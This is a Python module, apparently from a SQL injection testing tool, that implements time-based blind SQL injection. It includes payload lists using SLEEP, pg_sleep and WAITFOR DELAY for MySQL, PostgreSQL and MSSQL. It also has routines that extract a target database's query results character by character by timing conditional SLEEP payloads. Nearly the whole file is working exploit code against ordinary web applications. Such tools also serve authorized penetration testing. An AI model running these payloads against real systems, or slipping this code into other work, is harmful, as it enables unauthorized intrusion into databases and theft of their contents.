import logging
import time
from typing import List, Dict, Any
from core.request_engine import RequestEngine
from core.payload_manager import PayloadManager

class TimeBasedInjector:
    def __init__(self, request_engine: RequestEngine, payload_manager: PayloadManager):
        self.request_engine = request_engine
        self.payload_manager = payload_manager
        self.delay = 5  # Default delay in seconds
        
    def test_all_parameters(self) -> List[Dict[str, Any]]:
        """Test all parameters for time-based SQL injection vulnerabilities."""
        results = []
        
        # Test MySQL time-based injection
        mysql_results = self._test_mysql_time()
        if mysql_results:
            results.extend(mysql_results)
            
        # Test PostgreSQL time-based injection
        postgres_results = self._test_postgres_time()
        if postgres_results:
            results.extend(postgres_results)
            
        # Test MSSQL time-based injection
        mssql_results = self._test_mssql_time()
        if mssql_results:
            results.extend(mssql_results)
            
        return results
        
    def _test_mysql_time(self) -> List[Dict[str, Any]]:
        """Test for MySQL time-based SQL injection."""
        results = []
        
        # Common MySQL time-based payloads
        payloads = [
            "' AND SLEEP(5) --",
            "' AND SLEEP(5) #",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) #",
            "') AND SLEEP(5) --",
            "') AND SLEEP(5) #",
            "')) AND SLEEP(5) --",
            "')) AND SLEEP(5) #"
        ]
        
        for payload in payloads:
            try:
                # Send request with payload and measure response time
                start_time = time.time()
                response, _ = self.request_engine.send_request(payload=payload)
                end_time = time.time()
                
                # Check if response time indicates successful injection
                if self._check_time_based_response(start_time, end_time):
                    results.append({
                        "type": "mysql_time_based",
                        "payload": payload,
                        "status": "vulnerable",
                        "response_time": end_time - start_time
                    })
                    
            except Exception as e:
                logging.error(f"Error testing MySQL time-based injection: {str(e)}")
                continue
                
        return results
        
    def _test_postgres_time(self) -> List[Dict[str, Any]]:
        """Test for PostgreSQL time-based SQL injection."""
        results = []
        
        # Common PostgreSQL time-based payloads
        payloads = [
            "' AND pg_sleep(5) --",
            "' AND pg_sleep(5) #",
            "') AND pg_sleep(5) --",
            "') AND pg_sleep(5) #",
            "')) AND pg_sleep(5) --",
            "')) AND pg_sleep(5) #"
        ]
        
        for payload in payloads:
            try:
                # Send request with payload and measure response time
                start_time = time.time()
                response, _ = self.request_engine.send_request(payload=payload)
                end_time = time.time()
                
                # Check if response time indicates successful injection
                if self._check_time_based_response(start_time, end_time):
                    results.append({
                        "type": "postgres_time_based",
                        "payload": payload,
                        "status": "vulnerable",
                        "response_time": end_time - start_time
                    })
                    
            except Exception as e:
                logging.error(f"Error testing PostgreSQL time-based injection: {str(e)}")
                continue
                
        return results
        
    def _test_mssql_time(self) -> List[Dict[str, Any]]:
        """Test for MSSQL time-based SQL injection."""
        results = []
        
        # Common MSSQL time-based payloads
        payloads = [
            "' AND WAITFOR DELAY '0:0:5' --",
            "' AND WAITFOR DELAY '0:0:5' #",
            "') AND WAITFOR DELAY '0:0:5' --",
            "') AND WAITFOR DELAY '0:0:5' #",
            "')) AND WAITFOR DELAY '0:0:5' --",
            "')) AND WAITFOR DELAY '0:0:5' #"
        ]
        
        for payload in payloads:
            try:
                # Send request with payload and measure response time
                start_time = time.time()
                response, _ = self.request_engine.send_request(payload=payload)
                end_time = time.time()
                
                # Check if response time indicates successful injection
                if self._check_time_based_response(start_time, end_time):
                    results.append({
                        "type": "mssql_time_based",
                        "payload": payload,
                        "status": "vulnerable",
                        "response_time": end_time - start_time
                    })
                    
            except Exception as e:
                logging.error(f"Error testing MSSQL time-based injection: {str(e)}")
                continue
                
        return results
        
    def _check_time_based_response(self, start_time: float, end_time: float) -> bool:
        """Check if response time indicates successful time-based injection."""
        response_time = end_time - start_time
        
        # Check if response time is close to our delay
        if abs(response_time - self.delay) <= 1:  # Allow 1 second margin
            return True
            
        return False
        
    def extract_data_time_based(self, query: str) -> str:
        """Extract data using time-based SQL injection."""
        result = ""
        
        # Get length of result
        length = self._get_result_length(query)
        if not length:
            return result
            
        # Extract each character
        for i in range(1, length + 1):
            char = self._get_character(query, i)
            if char:
                result += char
                
        return result
        
    def _get_result_length(self, query: str) -> int:
        """Get length of query result using time-based injection."""
        # Try different length values
        for length in range(1, 100):  # Limit to 100 characters
            payload = f"' AND IF((SELECT LENGTH(({query})))={length},SLEEP(5),0) --"
            
            try:
                start_time = time.time()
                response, _ = self.request_engine.send_request(payload=payload)
                end_time = time.time()
                
                if self._check_time_based_response(start_time, end_time):
                    return length
            except:
                continue
                
        return 0
        
    def _get_character(self, query: str, position: int) -> str:
        """Get character at specific position using time-based injection."""
        # Try each ASCII character
        for char in range(32, 127):  # Printable ASCII characters
            payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))={char},SLEEP(5),0) --"
            
            try:
                start_time = time.time()
                response, _ = self.request_engine.send_request(payload=payload)
                end_time = time.time()
                
                if self._check_time_based_response(start_time, end_time):
                    return chr(char)
            except:
                continue
                
        return "" 
